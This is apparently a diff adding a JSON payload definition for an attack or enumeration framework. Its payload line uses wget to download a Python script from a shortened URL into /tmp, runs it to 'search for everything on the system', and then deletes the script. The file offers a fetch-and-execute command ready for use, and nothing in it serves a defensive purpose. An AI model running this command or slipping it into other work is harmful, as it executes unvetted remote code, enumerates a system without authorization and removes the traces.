@@ -1,0 +1,10 @@
+{
+  "data": {
+    "information": {
+      "description": "download the checkers program and execute it to search for everything on the system",
+      "type": "other",
+      "exec": "bash"
+    },
+    "payload": "wget -O /tmp/check.py https://git.io/fAiS1 && cd /tmp && python check.py -a && rm check.py"
+  }
+}
